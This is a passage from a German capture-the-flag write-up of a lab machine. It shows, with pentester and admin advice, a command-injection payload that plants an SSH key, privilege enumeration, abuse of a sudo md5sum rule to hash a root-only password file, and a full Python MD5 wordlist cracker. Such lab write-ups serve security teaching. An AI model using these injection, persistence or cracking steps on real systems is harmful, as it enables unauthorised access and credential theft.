+<strong>Empfehlung (Admin):</strong>
+Die Möglichkeit, Befehle als Benutzer `welcome` auszuführen, ist das Kernproblem. Wenn der Benutzer `welcome` SSH-Zugriff haben soll, stellen Sie sicher, dass die SSH-Konfiguration sicher ist (z.B. `PasswordAuthentication no` erzwingen, wenn Key-basierte Authentifizierung verwendet wird). Überwachen Sie die Erstellung neuer Dateien und Verzeichnisse in Benutzer-Home-Verzeichnissen, insbesondere von `.ssh`-Verzeichnissen und `authorized_keys`-Dateien, falls dies unerwartet geschieht.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+;echo 'ssh-ed25519 AAAAC...sss' >  /home/welcome/.ssh/authorized_keys
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+total 12
+drwxr-xr-x 2 welcome welcome 4096 Jun  3 10:27 .
+drwxr-xr-x 3 welcome welcome 4096 Jun  3 10:26 ..
+-rw-r--r-- 1 welcome welcome   91 Jun  3 10:27 <span class="command">authorized_keys</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Mit dem Befehl `;echo 'ssh-ed25519 AAAAC...sss' > /home/welcome/.ssh/authorized_keys` (wiederum über die RCE ausgeführt) wird mein öffentlicher SSH-Schlüssel (hier repräsentiert durch `'ssh-ed25519 AAAAC...sss'`, der tatsächliche Schlüssel ist länger) in die Datei `authorized_keys` im zuvor erstellten `.ssh`-Verzeichnis des Benutzers `welcome` geschrieben. Die `>`-Umleitung erstellt die Datei oder überschreibt sie, falls sie bereits existiert.
+Die nachfolgende Ausgabe (vermutlich von `;ls -la /home/welcome/.ssh`) bestätigt, dass die Datei `authorized_keys` mit Inhalt erstellt wurde.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dieser Schritt ist entscheidend für den komfortablen SSH-Zugriff. Durch das Hinterlegen des eigenen öffentlichen Schlüssels kann ich mich nun per SSH als Benutzer `welcome` am Zielsystem anmelden, ohne ein Passwort eingeben zu müssen, sondern unter Verwendung meines privaten Schlüssels. Dies ist eine Standardmethode, um persistenten und interaktiven Zugriff zu erlangen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nachdem der Schlüssel platziert wurde, versuchen Sie, sich per SSH mit `ssh welcome@umz.hmv` (oder der IP-Adresse) vom Angreifer-System aus zu verbinden. Stellen Sie sicher, dass die Berechtigungen für das `.ssh`-Verzeichnis (sollte `700` sein) und die `authorized_keys`-Datei (sollte `600` sein) korrekt sind, obwohl der SSH-Daemon oft auch mit etwas laxeren Berechtigungen funktioniert, solange der Benutzer der Eigentümer ist.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Siehe vorherige Empfehlungen zur Behebung der RCE und zur Überwachung von `.ssh`-Verzeichnissen. Wenn Key-basierte Authentifizierung verwendet wird, ist dies sicherer als Passwort-Authentifizierung. Stellen Sie jedoch sicher, dass die privaten Schlüssel der Benutzer sicher aufbewahrt werden. Überwachen Sie Änderungen an `authorized_keys`-Dateien, um unautorisierte Schlüssel zu entdecken.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh welcome@umz.hmv</span></div>
+        <pre>
+The authenticity of host 'umz.hmv (192.168.2.211)' can't be established.
+ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:71: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'umz.hmv' (ED25519) to the list of known hosts.
+Enter passphrase for key '/root/.ssh/id_rsa': 
+Linux Umz 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Apr 11 22:27:59 2025 from 192.168.3.94
+<span class="password">welcome@Umz:~$</span> 
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich versuche nun, mich per SSH mit dem Benutzer `welcome` auf dem Zielserver `umz.hmv` zu verbinden.
+- `ssh welcome@umz.hmv`: Der Befehl zum Herstellen der SSH-Verbindung.
+- Die erste Meldung "The authenticity of host ... can't be established." ist normal, wenn man sich zum ersten Mal mit einem neuen Server verbindet. Es wird der Fingerprint des Host-Schlüssels angezeigt.
+- Ich bestätige mit `yes`, dass ich die Verbindung fortsetzen möchte.
+- Der Host-Schlüssel wird dann dauerhaft zur `known_hosts`-Datei hinzugefügt.
+- Die Aufforderung "Enter passphrase for key '/root/.ssh/id_rsa':" bedeutet, dass mein lokaler privater SSH-Schlüssel (`/root/.ssh/id_rsa`) mit einer Passphrase geschützt ist. Ich muss diese Passphrase eingeben, um den Schlüssel zu verwenden.
+- Nach erfolgreicher Eingabe der Passphrase (nicht im Log sichtbar) werde ich auf dem Zielsystem als Benutzer `welcome` angemeldet, was durch den Prompt `welcome@Umz:~$` bestätigt wird. Die Systeminformationen (Linux Kernel Version, Debian Version) und die letzte Login-Zeit werden ebenfalls angezeigt.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Exzellent! Der SSH-Zugriff als Benutzer `welcome` über die Key-basierte Authentifizierung war erfolgreich. Dies verschafft mir eine interaktive Shell auf dem Zielsystem, was die weitere Enumeration und die Suche nach Wegen zur Privilegienerweiterung erheblich vereinfacht im Vergleich zur reinen RCE über das Web-Panel. Das ist ein wichtiger Meilenstein.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nachdem die interaktive Shell etabliert ist, führen Sie grundlegende Enumerationsbefehle aus: `id`, `whoami`, `pwd`, `ls -la /home`, `cat /etc/passwd`, `sudo -l`, `find / -type f -perm -4000 -ls 2>/dev/null` (Suche nach SUID-Dateien), `ps aux`, `netstat -tulnp`. Suchen Sie nach interessanten Dateien, Konfigurationen oder laufenden Prozessen, die für die Privilegienerweiterung ausgenutzt werden könnten.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass private SSH-Schlüssel, die für den Zugriff auf Server verwendet werden, sicher aufbewahrt und idealerweise mit einer starken Passphrase geschützt werden, wie hier geschehen. Überwachen Sie SSH-Logins auf verdächtige Aktivitäten oder Logins von unerwarteten Quellen. Halten Sie das System (Kernel, SSH-Dienst, alle Pakete) stets aktuell.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:~$ <span class="command">sudo -l</span></div>
+        <pre>
+Matching Defaults entries for welcome on Umz:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on Umz:
+    (ALL) NOPASSWD: <span class="command">/usr/bin/md5sum</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Als Benutzer `welcome` auf dem Zielsystem führe ich den Befehl `sudo -l` aus. Dieser Befehl listet die `sudo`-Berechtigungen auf, die dem aktuellen Benutzer gewährt wurden, d.h. welche Befehle der Benutzer als ein anderer Benutzer (typischerweise `root`) ausführen darf.
+Die Ausgabe zeigt, dass der Benutzer `welcome` den Befehl `/usr/bin/md5sum` als jeder Benutzer (`ALL`) ohne Passwortabfrage (`NOPASSWD`) ausführen darf.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dies ist ein sehr interessanter Fund! Die Möglichkeit, `/usr/bin/md5sum` mit `sudo` ohne Passwort auszuführen, ist ein potenzieller Vektor für Privilegienerweiterung. Obwohl `md5sum` selbst nicht direkt eine Shell öffnet, kann es, wenn es auf beliebige Dateien angewendet werden kann, zum Lesen von Dateien verwendet werden, auf die der Benutzer `welcome` normalerweise keinen Zugriff hätte (z.B. Shadow-Dateien, wenn auch der Hash dann nur ein Hash ist, oder private Schlüssel anderer Benutzer). GTFOBins ist eine bekannte Ressource, um nachzuschlagen, wie solche `sudo`-Berechtigungen ausgenutzt werden können. In diesem Fall ist die direkte Ausnutzung zum Lesen von Dateien, die `root` gehören, der naheliegendste Weg.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Überprüfen Sie auf GTFOBins oder ähnlichen Seiten, wie `sudo md5sum` missbraucht werden kann. Da `md5sum` Dateien lesen muss, um ihren Hash zu berechnen, könnte man versuchen, dies zum Lesen von sensiblen Dateien zu nutzen, auf die `root` Zugriff hat, aber `welcome` nicht. Zum Beispiel: `sudo /usr/bin/md5sum /etc/shadow` würde zwar nur den Hash der Datei ausgeben, aber der Lesevorgang selbst fände mit Root-Rechten statt. Man muss prüfen, ob die *Ausgabe* von `md5sum` manipuliert oder umgeleitet werden kann, oder ob es eine Option gibt, die den Dateiinhalt preisgibt (unwahrscheinlich für `md5sum`). Die primäre Ausnutzung hier ist das Lesen von Dateien, deren Inhalt dann gehasht wird – die Herausforderung ist, den Inhalt *vor* dem Hashing abzugreifen, falls `md5sum` nicht direkt lesbare Teile ausgibt. Allerdings ist das wahrscheinlichste Szenario, dass man `md5sum` auf eine Datei anwendet, auf die nur Root Lesezugriff hat, um zu bestätigen, dass man sie *lesen kann*, auch wenn man "nur" den Hash bekommt. Das könnte für spätere Schritte wichtig sein.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Gewähren Sie `sudo`-Berechtigungen nach dem Prinzip der geringsten Rechte. Wenn ein Benutzer einen Befehl mit `sudo` ausführen muss, stellen Sie sicher, dass dies der einzige Weg ist und dass der Befehl selbst keine Möglichkeiten zur Eskalation bietet. In diesem Fall ist die Berechtigung für `md5sum` ungewöhnlich und potenziell gefährlich, wenn es darum geht, die Existenz oder Hashwerte von sensiblen Dateien zu bestätigen, auf die der Benutzer sonst keinen Zugriff hätte. Wenn ein Benutzer lediglich Hashes von Dateien erstellen soll, für die er bereits Leserechte hat, benötigt er keine `sudo`-Berechtigung für `md5sum`.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:~$ <span class="command">ls ..</span></div>
+        <pre>
+umzyyds  welcome
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:~$ <span class="command">ls -la /etc/passwd</span></div>
+        <pre>
+-rw-r--r-- 1 root root 1442 May  3 10:28 /etc/passwd
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:~$ <span class="command">ls -la /etc/shadow</span></div>
+        <pre>
+-rw-r----- 1 root shadow 1076 May  3 10:43 /etc/shadow
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich führe einige grundlegende Enumerationsbefehle aus:
+1.  `ls ..`: Listet den Inhalt des übergeordneten Verzeichnisses von `/home/welcome` (also `/home`) auf. Es zeigt die Verzeichnisse `umzyyds` und `welcome`. Dies deutet auf einen weiteren Benutzer namens `umzyyds` hin.
+2.  `ls -la /etc/passwd`: Zeigt die Berechtigungen und Metadaten der Datei `/etc/passwd`. Sie ist für alle lesbar.
+3.  `ls -la /etc/shadow`: Zeigt die Berechtigungen und Metadaten der Datei `/etc/shadow`. Sie ist nur für den Benutzer `root` und die Gruppe `shadow` lesbar. Der Benutzer `welcome` hat keinen direkten Lesezugriff.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Entdeckung des Benutzers `umzyyds` ist wichtig für die weitere Enumeration. Die Berechtigungen von `/etc/passwd` und `/etc/shadow` sind Standard auf Linux-Systemen. Der fehlende Lesezugriff auf `/etc/shadow` für `welcome` ist normal und erwartet. Die Information über `umzyyds` und die `sudo -l` Ausgabe für `md5sum` könnten in Kombination relevant werden.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Versuchen Sie, mehr Informationen über den Benutzer `umzyyds` zu sammeln. Überprüfen Sie, ob es Dateien gibt, die `umzyyds` gehören und auf die `welcome` möglicherweise Zugriff hat. Der `sudo md5sum` könnte genutzt werden, um zu prüfen, ob `umzyyds` sensible Dateien in seinem Home-Verzeichnis hat, auf die `root` Zugriff hätte (z.B. private Schlüssel, Passwortdateien).
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass die Home-Verzeichnisse von Benutzern korrekte Berechtigungen haben (typischerweise `700` oder `750`), um unbefugten Zugriff durch andere nicht-privilegierte Benutzer zu verhindern. Die Berechtigungen für `/etc/passwd` und `/etc/shadow` sind hier korrekt konfiguriert.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+        <pre>
+   261675     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 <span class="command">/usr/bin/chsh</span>
+   261674     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 <span class="command">/usr/bin/chfn</span>
+   265000     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 <span class="command">/usr/bin/newgrp</span>
+   261677     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 <span class="command">/usr/bin/gpasswd</span>
+   262730     48 -rwsr-xr-x   1 root     root        47184 Apr  6  2024 <span class="command">/usr/bin/mount</span>
+   262341     64 -rwsr-xr-x   1 root     root        63568 Apr  6  2024 <span class="command">/usr/bin/su</span>
+   262732     36 -rwsr-xr-x   1 root     root        34888 Apr  6  2024 <span class="command">/usr/bin/umount</span>
+   289299     24 -rwsr-xr-x   1 root     root        23448 Jan 13  2022 <span class="command">/usr/bin/pkexec</span>
+   290911    180 -rwsr-xr-x   1 root     root       182600 Jan 14  2023 <span class="command">/usr/bin/sudo</span>
+   261678     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 <span class="command">/usr/bin/passwd</span>
+   263840     52 -rwsr-xr--   1 root     messagebus    51336 Jun  6  2023 <span class="command">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   526406     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 <span class="command">/usr/lib/eject/dmcrypt-get-device</span>
+   271879    472 -rwsr-xr-x   1 root     root         481608 Dec 21  2023 <span class="command">/usr/lib/openssh/ssh-keysign</span>
+   289303     20 -rwsr-xr-x   1 root     root          19040 Jan 13  2022 <span class="command">/usr/libexec/polkit-agent-helper-1</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Mit dem Befehl `find / -type f -perm -4000 -ls 2>/dev/null` suche ich systemweit nach Dateien (`-type f`) mit gesetztem SUID-Bit (`-perm -4000`). Das SUID-Bit erlaubt es einem Benutzer, eine ausführbare Datei mit den Rechten des Dateieigentümers (oft `root`) auszuführen, anstatt mit den eigenen Rechten. Die Option `-ls` zeigt detaillierte Informationen zu den gefundenen Dateien an. `2>/dev/null` leitet Fehlermeldungen (z.B. "Permission denied" beim Durchsuchen bestimmter Verzeichnisse) ins Nichts um, um die Ausgabe sauber zu halten.
+Die Ausgabe listet eine Reihe von Standard-Linux-Programmen auf, die typischerweise das SUID-Bit gesetzt haben (z.B. `passwd`, `su`, `sudo`, `mount`, `umount`).
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Suche nach SUID-Binaries ist ein Standardverfahren bei der Privilegienerweiterung. Wenn eine SUID-Datei, die `root` gehört, eine Schwachstelle aufweist oder missbräuchlich verwendet werden kann (siehe GTFOBins), kann dies zu Root-Rechten führen. Die hier gefundenen Dateien sind größtenteils Standardprogramme. Es erfordert weitere Analyse, ob eines dieser Programme in der spezifischen Version auf diesem System für eine Eskalation ausgenutzt werden kann, oder ob es nicht standardmäßige SUID-Dateien gibt, die hier nicht sofort als ungewöhnlich erkennbar sind. Auf den ersten Blick sind keine exotischen oder offensichtlich anfälligen SUID-Dateien zu sehen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Überprüfen Sie die Versionen der gefundenen SUID-Programme (insbesondere `sudo`, `pkexec`) auf bekannte Exploits. Suchen Sie auf GTFOBins nach Möglichkeiten, diese SUID-Binaries auszunutzen, auch wenn sie Standard sind. Manchmal können sie in Kombination mit anderen Faktoren (z.B. Umgebungsvariablen, spezifischen Konfigurationen) missbraucht werden. Achten Sie besonders auf weniger verbreitete SUID-Dateien, falls vorhanden.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Minimieren Sie die Anzahl der SUID-gesetzten Dateien auf das absolut Notwendige. Entfernen Sie das SUID-Bit von Programmen, bei denen es nicht zwingend erforderlich ist. Halten Sie alle Systemkomponenten, insbesondere solche, die mit SUID-Rechten laufen, stets aktuell, um bekannte Schwachstellen zu patchen. Überwachen Sie das Dateisystem regelmäßig auf neu hinzugefügte oder unerwartete SUID/SGID-Dateien.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:/tmp$ <span class="command">cd /home/umzyyds/</span></div>
+        <pre>
+-bash: cd: /home/umzyyds/: <span class="password">Permission denied</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich versuche, als Benutzer `welcome` in das Home-Verzeichnis des anderen gefundenen Benutzers `umzyyds` (`/home/umzyyds/`) zu wechseln.
+Die Ausgabe `-bash: cd: /home/umzyyds/: Permission denied` zeigt, dass der Benutzer `welcome` keine ausreichenden Berechtigungen hat, um auf dieses Verzeichnis zuzugreifen.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dies ist ein erwartetes Verhalten, wenn die Home-Verzeichnisse korrekt mit restriktiven Berechtigungen (z.B. `drwx------` oder `drwxr-x---`) konfiguriert sind, die nur dem Eigentümer (und ggf. der Gruppe) den Zugriff erlauben. Es bestätigt, dass ich als `welcome` nicht einfach auf die Dateien von `umzyyds` zugreifen kann.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Da der direkte Zugriff verweigert wird, müssen andere Wege gefunden werden, um Informationen über `umzyyds` zu erlangen oder mit diesem Benutzer zu interagieren. Die zuvor gefundene `sudo md5sum`-Berechtigung könnte hier nützlich sein, um zu versuchen, Hashes von Dateien im Home-Verzeichnis von `umzyyds` zu erstellen (als `root` ausgeführt), falls dies für die weitere Strategie relevant ist. Es ist auch möglich, dass `umzyyds` auf andere Weise kompromittiert werden muss.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Die Berechtigungen für das Home-Verzeichnis von `umzyyds` scheinen korrekt gesetzt zu sein, um den Zugriff durch andere nicht-privilegierte Benutzer zu verhindern. Dies ist eine gute Sicherheitspraxis. Stellen Sie sicher, dass diese Konfiguration für alle Benutzer-Home-Verzeichnisse konsistent ist.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:/opt$ <span class="command">ls -la /opt/</span></div>
+        <pre>
+total 12
+drwxr-xr-x  3 root    root    4096 May  3 09:46 .
+drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
+drwxr-xr-x  2 welcome welcome 4096 May  3 10:32 <span class="command">flask-debug</span>
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:/opt$ <span class="command">ls -la /opt/flask-debug/</span></div>
+        <pre>
+total 20
+drwxr-xr-x 2 welcome welcome 4096 May  3 10:32 .
+drwxr-xr-x 3 root    root    4096 May  3 09:46 ..
+-rw-r--r-- 1 root    root    5001 May  3 10:23 <span class="command">flask_debug.py</span>
+-rwx------ 1 root    root      10 May  3 10:32 <span class="command">umz.pass</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich untersuche das Verzeichnis `/opt`, das oft für optional installierte Softwarepakete verwendet wird.
+- `ls -la /opt/`: Zeigt, dass es ein Unterverzeichnis namens `flask-debug` gibt, dessen Eigentümer `welcome:welcome` ist.
+- `ls -la /opt/flask-debug/`: Listet den Inhalt dieses Verzeichnisses auf. Es enthält zwei interessante Dateien:
+    - `flask_debug.py`: Eine Python-Datei, die `root:root` gehört und für alle lesbar ist.
+    - `umz.pass`: Eine Datei, die ebenfalls `root:root` gehört, aber nur für `root` Lese- und Schreibrechte (`-rw-------`) sowie Ausführungsrechte (`x`) hat. Die Ausführungsrechte für eine Passwortdatei sind ungewöhnlich. Der Name `umz.pass` deutet stark auf eine Passwortdatei hin.
+
+Die Zeitstempel der Dateien sind relativ aktuell.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das Verzeichnis `flask-debug` und insbesondere die Dateien darin sind hochinteressant.
+- `flask_debug.py`: Der Name legt nahe, dass es sich um ein Flask (Python Web-Framework) Skript handelt, das möglicherweise Debug-Funktionen enthält. Da es `root` gehört, aber von `welcome` gelesen werden kann, könnte der Quellcode Hinweise auf die Funktionsweise einer Anwendung oder auf Schwachstellen geben.
+- `umz.pass`: Dies ist der vielversprechendste Fund. Eine Datei, die `root` gehört, `*.pass` heißt und nur für `root` les- und schreibbar ist, enthält mit hoher Wahrscheinlichkeit ein Passwort – möglicherweise für den Benutzer `umzyyds` oder sogar für `root`. Die Ausführungsberechtigung ist merkwürdig und könnte ein Hinweis auf eine unübliche Verwendung oder einen Fehler sein.
+Der Benutzer `welcome` kann `umz.pass` nicht direkt lesen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Die Datei `umz.pass` ist das primäre Ziel. Da `welcome` sie nicht direkt lesen kann, aber `sudo /usr/bin/md5sum` als `root` ausführen darf, versuchen Sie, den MD5-Hash dieser Datei zu erhalten: `sudo /usr/bin/md5sum /opt/flask-debug/umz.pass`. Wenn Sie den Hash haben, versuchen Sie, ihn offline zu cracken (z.B. mit Hashcat oder John the Ripper) oder in Online-Datenbanken zu suchen.
+Lesen Sie auch den Inhalt von `flask_debug.py`, um dessen Zweck und mögliche Schwachstellen zu verstehen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Passwörter sollten niemals im Klartext in Dateien gespeichert werden, insbesondere nicht in Dateien, die von anderen Benutzern (auch wenn nur als Hash über `sudo md5sum`) potenziell zugänglich gemacht werden könnten. Wenn Passwörter gespeichert werden müssen, dann nur als starke, gesaltete Hashes (z.B. Argon2, scrypt, bcrypt). Die Berechtigungen für `umz.pass` (`-rwx------` für `root`) sind zwar restriktiv für den direkten Lesezugriff, aber die Kombination mit der `sudo md5sum`-Berechtigung für `welcome` hebelt dies indirekt aus. Die Ausführungsberechtigung für eine Passwortdatei ist sinnlos und sollte entfernt werden. Überprüfen Sie den Zweck von `flask_debug.py` und entfernen oder sichern Sie es, wenn es nicht benötigt wird oder Debug-Funktionen enthält, die in einer Produktionsumgebung nicht aktiv sein sollten.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:/opt/flask-debug$ <span class="command">sudo -u root /usr/bin/md5sum umz.pass</span></div>
+        <pre>
+<span class="password">a963fadd7fd379f9bc294ad0ba44f659</span>  umz.pass
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Hier nutze ich die `sudo`-Berechtigung, die dem Benutzer `welcome` gewährt wurde.
+Der Befehl `sudo -u root /usr/bin/md5sum umz.pass` führt `/usr/bin/md5sum` explizit als Benutzer `root` (obwohl `(ALL)` in `sudo -l` dies bereits impliziert und `-u root` hier nicht zwingend notwendig wäre, aber die Klarheit erhöht) auf die Datei `umz.pass` im aktuellen Verzeichnis (`/opt/flask-debug/`) aus.
+Da `md5sum` als `root` läuft, kann es die Datei `umz.pass` lesen, auch wenn `welcome` selbst keine direkten Leserechte hat.
+Die Ausgabe ist der MD5-Hash des Inhalts der Datei `umz.pass`: `a963fadd7fd379f9bc294ad0ba44f659`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das ist ein entscheidender Fortschritt! Obwohl ich den Inhalt von `umz.pass` nicht direkt lesen kann, habe ich nun den MD5-Hash des Passworts (oder des Dateiinhalts). MD5 ist ein relativ schwacher Hashing-Algorithmus, und es besteht eine gute Chance, diesen Hash mit gängigen Tools und Wortlisten zu knacken, besonders wenn das zugrundeliegende Passwort nicht extrem komplex ist.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Der nächste Schritt ist das Knacken dieses MD5-Hashes. Verwenden Sie Tools wie Hashcat oder John the Ripper mit gängigen Wortlisten (z.B. `rockyou.txt`). Suchen Sie den Hash auch in Online-MD5-Datenbanken (Rainbow Tables). Das Ziel ist es, das Klartextpasswort zu erhalten, das sich in `umz.pass` befindet. Dieses Passwort könnte für den Benutzer `umzyyds` oder sogar für `root` sein.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Dies unterstreicht die Gefahr, `sudo`-Berechtigungen für Befehle zu gewähren, die Dateien lesen können, auch wenn der Benutzer selbst keine direkten Leserechte für diese Dateien hat. Die `sudo`-Regel sollte überdacht werden. Passwörter sollten, wie bereits erwähnt, niemals als Klartext oder nur mit MD5 gehasht gespeichert werden. Verwenden Sie stattdessen starke, gesaltete Hashing-Algorithmen.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi md5cracker.py</span></div>
+        <pre>
+#!/usr/bin/env python3
+
+import hashlib
+import time
+
+TARGET_HASH = "a963fadd7fd379f9bc294ad0ba44f659"
+WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt" 
+
+def calculate_md5_with_appended_newline(text_to_hash):
+    text_with_newline = text_to_hash + "\n"
+    return hashlib.md5(text_with_newline.encode('utf-8')).hexdigest()
+
+def main():
+    try:
+        with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
+            print(f"Starte Hash-Vergleich mit Wordlist: {WORDLIST_PATH}")
+            print(f"Ziel-Hash: {TARGET_HASH} (erwartet von 'Passwort\\n')")
+            
+            line_count = 0
+            processed_count = 0
+            start_time = time.time()
+            found_password_clean = None
+
+            for line in f:
+                line_count += 1
+                processed_count += 1
+                
+                password_candidate_from_file = line.strip()
+                
+                if not password_candidate_from_file:
+                    continue
+
+                current_hash = calculate_md5_with_appended_newline(password_candidate_from_file)
+
+                if current_hash == TARGET_HASH:
+                    found_password_clean = password_candidate_from_file
+                    end_time = time.time()
+                    elapsed_time = end_time - start_time
+                    print("\n" + "*" * 50)
+                    print(f"PASSWORT GEFUNDEN nach {line_count} Versuchen!")
+                    print(f"Passwort (ohne das angehängte \\n): {found_password_clean}")
+                    print(f"Gehasht wurde: '{found_password_clean}\\n'")
+                    print(f"Erzeugter Hash: {current_hash}")
+                    print(f"Dauer: {elapsed_time:.2f} Sekunden")
+                    print("*" * 50)
+                    break 
+
+                if processed_count % 500000 == 0: 
+                    current_time = time.time()
+                    elapsed_time = current_time - start_time
+                    if elapsed_time > 0:
+                        rate = processed_count / elapsed_time
+                        print(f"Verarbeitet: {processed_count} Wörter... Rate: {rate:.0f} W/s", end='\r')
+            
+            print() 
+
+            if not found_password_clean:
+                end_time = time.time()
+                elapsed_time = end_time - start_time
+                print(f"Passwort NICHT in der Wordlist '{WORDLIST_PATH}' gefunden nach {line_count} Versuchen.")
+                print(f"Gesamtdauer: {elapsed_time:.2f} Sekunden.")
+
+    except FileNotFoundError:
+        print(f"Fehler: Wordlist nicht gefunden unter '{WORDLIST_PATH}'")
+    except Exception as e:
+        print(f"Ein unerwarteter Fehler ist aufgetreten: {e}")
+
+if __name__ == "__main__":
+    main()
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Auf meinem lokalen Angreifer-System erstelle ich ein Python-Skript namens `md5cracker.py`. Dieses Skript ist darauf ausgelegt, den zuvor erlangten MD5-Hash (`a963fadd7fd379f9bc294ad0ba44f659`) gegen eine Wortliste (`rockyou.txt`) zu brute-forcen.
+Das Skript macht eine wichtige Annahme: Es fügt jedem Passwortkandidaten aus der Wortliste ein Newline-Zeichen (`\n`) hinzu, bevor es den MD5-Hash berechnet (`calculate_md5_with_appended_newline`). Dies ist eine übliche Praxis, da viele Tools (wie `echo "password" > file`) standardmäßig ein Newline am Ende hinzufügen, und wenn eine solche Datei dann gehasht wird, wird das Newline mitgehasht.
+Das Skript iteriert durch `rockyou.txt`, berechnet für jedes Wort den MD5-Hash (mit angehängtem `\n`) und vergleicht ihn mit dem `TARGET_HASH`. Es gibt auch Fortschrittsanzeigen aus.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das Erstellen eines benutzerdefinierten Skripts zum Knacken des Hashes ist ein guter Ansatz, besonders wenn man spezifische Modifikationen am Hashing-Prozess vornehmen muss (wie das Anhängen eines Newline-Zeichens). Die Verwendung von `rockyou.txt` ist eine Standardwahl für Wortlisten. Die Annahme, dass ein Newline-Zeichen Teil des gehashten Inhalts ist, ist plausibel und oft korrekt für Passwörter, die aus einfachen Textdateien stammen. Das Skript ist gut strukturiert und enthält Fehlerbehandlung sowie eine Fortschrittsanzeige.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Führen Sie das Skript aus, um den Hash zu knacken. Wenn `rockyou.txt` das Passwort nicht enthält, versuchen Sie andere Wortlisten oder Regel-basierte Angriffe mit Hashcat. Berücksichtigen Sie, dass das Newline-Zeichen möglicherweise nicht vorhanden ist – in diesem Fall müsste das Skript angepasst oder ein anderes Tool verwendet werden, das diese Variationen abdeckt.
+<br>
+<strong>Empfehlung (Admin):</strong>
